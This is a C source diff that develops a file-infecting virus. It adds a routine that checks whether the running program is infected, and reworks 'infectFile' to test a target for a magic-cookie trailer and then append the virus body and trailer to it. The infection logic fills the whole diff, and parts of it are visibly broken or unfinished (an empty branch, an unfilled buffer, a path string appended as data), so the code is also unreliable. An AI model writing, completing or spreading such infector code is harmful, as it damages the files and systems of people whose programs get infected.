@@ -23,15 +23,9 @@ static int appendTrailer(FILE *fp)
     trl->rlEntryPt = NULL;
     if (fseek(fp, 0L, SEEK_END) != 0) goto fail;
     fgetpos(fp, &(trl->myOffset));
-#ifdef _SMSHR_DEBUG
-    int sw;
-    if ((sw = fwrite(trl, sizeof(trailer_t), 1, fp)) != 1)
-    {
-        PE("fwrite");
-#else
     if (fwrite(trl, sizeof(trailer_t), 1, fp) != 1)
     {
-#endif
+        PE("fwrite");
         goto fail;
     }
     free(trl);
@@ -90,14 +84,45 @@ static int appendBuf2Fp(char *buf, size_t siz, FILE *fp)
     return (ERR_OK);
 }
 
-int infectFile(char *buf, size_t siz, char *target)
+static int mapMe(char *argv0, char **dstPtr)
 {
     FILE *fp;
+    trailer_t *trl;
+    char *buf;
 
+    // do _NOT_ use mmap here!
+    fp = fopen(argv0, "rb");
+    if (!fp) return (ERR_FAIL);
+    D2("Am I infected?")
+    if ((trl = getTrailer(fp)) != NULL)
+    {
+        D2("im already infected")
+    }
+    else
+    {
+    }
+    return (ERR_OK);
+}
+
+int infectFile(char *argv0, size_t siz, char *target)
+{
+    FILE *fp;
+    char *buf;
+    trailer_t *trl;
+
+    D2("Is target already infected?")
+    fp = fopen(target, "rb");
+    if (!fp) return (ERR_FAIL);
+    if ((trl = getTrailer(fp)) != NULL)
+    {
+        D("target file '%s' infected (magicN: 0x%08x)", target, MAGIC_COOKIE)
+        goto done;
+    }
     fp = fopen(target, "ab");
     if (!fp) return (ERR_FAIL);
+    mapMe(argv0, &buf);
     D("infecting file '%s'", target);
-    if (appendBuf2Fp(buf, siz, fp) == ERR_OK)
+    if (appendBuf2Fp(argv0, siz, fp) == ERR_OK)
     {
         if (appendTrailer(fp) == ERR_OK)
         {
@@ -119,7 +144,6 @@ int infectFile(char *buf, size_t siz, char *target)
 #ifdef _SMSHR_DEBUG
     fp = fopen(target, "rb");
     if (!fp) return (ERR_FAIL);
-    trailer_t *trl;
     if ((trl = getTrailer(fp)) != NULL)
     {
         D2("file infection succeeded")
@@ -129,7 +153,9 @@ int infectFile(char *buf, size_t siz, char *target)
     {
         E2("file infection failed")
     }
+    free(trl);
 #endif // _SMSHR_DEBUG
+done:
     fclose(fp);
     return (ERR_OK);
 fail:
